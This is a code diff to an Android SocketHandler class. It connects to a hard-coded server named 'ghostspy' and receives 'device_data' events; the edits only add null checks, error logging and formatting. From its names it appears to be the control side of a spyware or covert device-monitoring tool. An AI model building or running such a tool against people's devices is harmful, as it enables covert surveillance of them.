@@ -8,7 +8,6 @@ import java.net.URISyntaxException;
 
 public class SocketHandler {
     private static Socket socket;
-    // URL PERMANEN CLOUDFLARE
     private static final String SERVER_URL = "https://ghostspy.bruang.biz.id";
     private static MainActivity activity;
 
@@ -16,14 +15,22 @@ public class SocketHandler {
         activity = act;
         try {
             socket = IO.socket(SERVER_URL);
-        } catch (URISyntaxException e) {}
+        } catch (URISyntaxException e) {
+            e.printStackTrace();
+        }
     }
 
     public static void connect() {
         if (socket == null) return;
-        socket.on(Socket.EVENT_CONNECT, args -> activity.runOnUiThread(() -> activity.updateConnectionStatus(true)));
-        socket.on("device_data", args -> activity.runOnUiThread(() -> activity.handleIncomingData((JSONObject) args[0])));
-        socket.on(Socket.EVENT_DISCONNECT, args -> activity.runOnUiThread(() -> activity.updateConnectionStatus(false)));
+        socket.on(Socket.EVENT_CONNECT, args -> {
+            if (activity != null) activity.updateConnectionStatus(true);
+        });
+        socket.on("device_data", args -> {
+            if (activity != null) activity.handleIncomingData((JSONObject) args[0]);
+        });
+        socket.on(Socket.EVENT_DISCONNECT, args -> {
+            if (activity != null) activity.updateConnectionStatus(false);
+        });
         socket.connect();
     }
 
@@ -38,5 +45,7 @@ public class SocketHandler {
         } catch (Exception e) {}
     }
 
-    public static boolean isConnected() { return socket != null && socket.connected(); }
+    public static boolean isConnected() {
+        return socket != null && socket.connected();
+    }
 }
